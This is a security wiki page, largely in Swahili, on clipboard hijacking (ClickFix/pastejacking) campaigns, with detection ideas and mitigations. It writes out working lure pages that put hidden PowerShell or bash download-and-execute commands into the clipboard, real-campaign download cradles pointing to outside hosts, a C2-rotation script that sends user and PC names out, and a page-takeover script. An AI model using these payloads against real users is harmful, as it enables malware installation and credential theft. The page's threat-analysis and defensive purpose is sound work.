# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – ushauri wa zamani lakini bado ni sahihi

## Overview

Clipboard hijacking – pia inajulikana kama *pastejacking* – hutumia ukweli kwamba watumiaji mara kwa mara hunakili-na-kubandika amri bila kuzihakiki. Ukurasa wa wavuti wenye nia mbaya (au mazingira yoyote yenye uwezo wa JavaScript kama programu ya Electron au Desktop) huweka kwa mpangilio maandishi yanayodhibitiwa na mshambuliaji kwenye system clipboard. Waathiriwa huhimizwa, kwa kawaida kupitia maelekezo ya social-engineering yaliyoundwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* maudhui ya clipboard, jambo linalotekeleza amri zozote papo hapo.

Kwa kuwa **hakuna file inayopakuliwa na hakuna attachment inayofunguliwa**, mbinu hii hupita udhibiti mwingi wa usalama wa e-mail na web-content unaofuatilia attachments, macros au direct command execution. Kwa hivyo, shambulio hili ni maarufu katika kampeni za phishing zinazosambaza familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## Wallet-address replacement clippers

Tofauti nyingine ya **clipboard hijacking** hai-bandiki amri kabisa: husubiri hadi mwathiriwa ananakili **cryptocurrency wallet address**, kisha kimyakimya huibadilisha na ile inayodhibitiwa na mshambuliaji kabla tu ya paste. Hii ni yenye ufanisi hasa dhidi ya fomati ndefu za wallet kwa sababu watumiaji mara nyingi huhakiki tu herufi za mwanzo/za mwisho.

Sifa za kawaida za ulimwengu halisi:
- **Thin loader + nested payload**: app/exe inayoonekana huonekana kama kifaa halali cha trading au "profit", huku clipper halisi ikiwa imefichwa ndani zaidi ya bundle (kwa mfano .NET loader inayozindua nested Rust payload).
- **Regex-driven replacement**: malware hulinganisha strings kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata strings za jumla za **herufi 44 zinazofanana na Solana** na kuziandika upya ziwe wallets za mshambuliaji.
- **Wallet rotation at scale**: sampuli za kisasa za Windows zinaweza kupachika **maelfu** ya replacement wallets kwa kila currency badala ya address moja tuli, kupunguza burn ya wallet reputation baada ya kila wizi.

### Windows clipper flow

Utekelezaji wa kawaida ni hidden window iliyosajiliwa kwa **`AddClipboardFormatListener`**. Kwenye kila clipboard update, malware kwa kawaida huita:
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma text.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha string ya wallet na thamani ya mshambuliaji.

Minimal hunting regexes mara nyingi huonekana kwenye clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kudumu kwa kiwango cha user-level kinatosha kwa impact. Mchoro mmoja unaoonekana ni:
- Nakili payload hadi **`%APPDATA%\silke\silke.exe`**
- Unda **Startup-folder LNK** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya detection:
- Processes zinazopiga clipboard APIs mfululizo wakati pia zinaandika chini ya `%APPDATA%` na folda ya user **Startup**.
- Uundaji mpya wa LNK/executable ukifuatiwa na clipboard rewrites za wallet-address.
- Archives au fake-software bundles zenye files nyingi zisizotumika pamoja na small launcher inayoanza nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Kwenye macOS, baadhi ya campaigns husafirisha helper ya **`unlocker.command`** na kumuagiza victim kubofya kulia → **Open** ikiwa Gatekeeper inasema app imeharibika au imetoka kwa unidentified developer. Script hiyo kwa urahisi huondoa quarantine na kuzindua `.app` ya karibu:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, zile za sasa hutegemea **Clipboard API** ya asinkroni (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Mtumiaji hutembelea tovuti yenye typosquatting au iliyoathiriwa (mf. `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyodungwa huita helper ya `unsecuredCopyToClipboard()` ambayo kwa siri huhifadhi PowerShell one-liner iliyosimbwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekeleza, inapakua archive ambayo ina executable halali pamoja na DLL hasidi (classic DLL sideloading).
5. Loader husimbua stages za ziada, huingiza shellcode na kusakinisha persistence (mf. scheduled task) – hatimaye kuendesha NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) hutafuta `msvcp140.dll` kwenye saraka yake.
* DLL hasidi hutatua APIs kwa nguvu kwa kutumia **GetProcAddress**, hupakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzisimbua kwa kutumia rolling XOR key `"https://google.com/"`, huingiza final shellcode na hufungua **client32.exe** (NetSupport RAT) kwenda `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Hupakua `la.txt` kwa kutumia **curl.exe**
2. Hutekeleza JScript downloader ndani ya **cscript.exe**
3. Huchukua MSI payload → huweka `libcef.dll` pembeni ya application iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Some ClickFix campaigns skip file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa hubadilishwa kwa kurudishwa nyuma wakati wa runtime ili kushinda ukaguzi wa kawaida.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – kuwezesha mzunguko wa domain wa haraka.

Kipande kidogo cha JS kinachotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida hutumia loader inayoweka persistence na kuvuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwenye certificate iliyowekwa hardcoded na kugawanya traffic.

Mawazo ya detection mahususi kwa variant hii
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Startup artifacts: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayowaita WScript/CScript na path ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na telemetry ya command-line ikijumuisha `.split('').reverse().join('')` au `eval(a.responseText)`.
- Kurudia `powershell -NoProfile -NonInteractive -Command -` na large stdin payloads ili kulisha scripts ndefu bila command lines ndefu.
- Scheduled Tasks ambazo baadaye huendesha LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayoonekana kama updater (mfano, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Majina ya host na URLs za C2 zinazobadilika kila siku zenye pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlate matukio ya clipboard write yakifuatwa na paste ya Win+R kisha mara moja `powershell.exe` execution.


Blue-teams wanaweza kuchanganya clipboard, process-creation na registry telemetry ili kubaini abuse ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi historia ya commands za **Win + R** – tafuta entries zisizo za kawaida za Base64 / obfuscated.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa file creations chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au temporary folders muda mfupi kabla ya suspicious 4688 event.
* EDR clipboard sensors (kama zipo) – correlate `Clipboard Write` ikifuatiwa mara moja na new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za hivi karibuni hutengeneza kwa wingi fake CDN/browser verification pages ("Just a moment…", IUAM-style) zinazowalazimisha watumiaji kunakili commands mahususi za OS kutoka clipboard yao kwenda native consoles. Hii huhamisha execution kutoka browser sandbox na hufanya kazi kwenye Windows na macOS.

Sifa kuu za pages zilizotengenezwa na builder
- OS detection kupitia `navigator.userAgent` ili kurekebisha payloads (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Automatic clipboard-copy kwenye benign UI actions (checkbox/Copy) huku text inayoonekana ikiweza kutofautiana na clipboard content.
- Mobile blocking na popover yenye maelekezo ya hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → fungua Terminal→paste→Enter.
- Obfuscation ya hiari na single-file injector ya ku-overwrite DOM ya site iliyoharibika kwa Tailwind-styled verification UI (hakuna haja ya kusajili domain mpya).

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza visible artifacts.

In-place page takeover kwenye sites zilizo compromised
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Mawazo ya kugundua na kuwinda mahsusi kwa IUAM-style lures
- Web: Pages zinazofunga Clipboard API kwa verification widgets; kutofautiana kati ya maandishi yanayoonyeshwa na clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace katika mazingira yenye shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya browser interaction; batch/MSI installers kutekelezwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm ikizalisha `bash`/`curl`/`base64 -d` na `nohup` karibu na browser events; background jobs kuendelea baada ya terminal kufungwa.
- Correlate `RunMRU` Win+R history na clipboard writes pamoja na subsequent console process creation.

Tazama pia kwa techniques za kusaidia

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kucompromise WordPress sites na kuingiza loader JavaScript ambayo ina-chain external hosts (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (k.m. POSTs kwenda Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kuvuta current lure logic. Recent overlays hutumia sana fake CAPTCHAs zinazoelekeza watumiaji kunakili/kubandika one-liner (T1204.004) badala ya kupakua chochote.
- Initial execution inaongezewa ugawaji kwa signed script hosts/LOLBAS. Januari 2026 chains zilibadilisha matumizi ya awali ya `mshta` na kutumia `SyncAppvPublishingServer.vbs` ya built-in ikitekelezwa kupitia `WScript.exe`, ikipitisha PowerShell-like arguments zenye aliases/wildcards ili kuchukua remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imesainiwa na kawaida hutumiwa na App-V; ikiunganishwa na `WScript.exe` na arguments zisizo za kawaida (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) inakuwa hatua ya LOLBAS yenye ishara kali kwa ClearFake.
- February 2026 fake CAPTCHA payloads zilihamia tena kwenye pure PowerShell download cradles. Mifano miwili ya live:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Chain ya kwanza ni `iex(irm ...)` grabber ya in-memory; ya pili hu-stage kupitia `WinHttp.WinHttpRequest.5.1`, huandika temp `.ps1`, kisha huanzisha kwa `-ep bypass` kwenye window iliyofichwa.

Vidokezo vya detection/hunting kwa variants hizi
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au raw IP `iex(irm ...)` patterns.
- Network: outbound kwenda CDN worker hosts au blockchain RPC endpoints kutoka script hosts/PowerShell muda mfupi baada ya web browsing.
- File/registry: temporary `.ps1` creation chini ya `%TEMP%` pamoja na RunMRU entries zenye hizi one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) ikitekelezwa na external URLs au obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au require user gesture.
2. Security awareness – waelimishe users ku *type* sensitive commands au kuzipaste kwanza kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control kuzuia arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** mara nyingi hutumia same ClickFix approach baada ya kuwavutia users kwenye malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
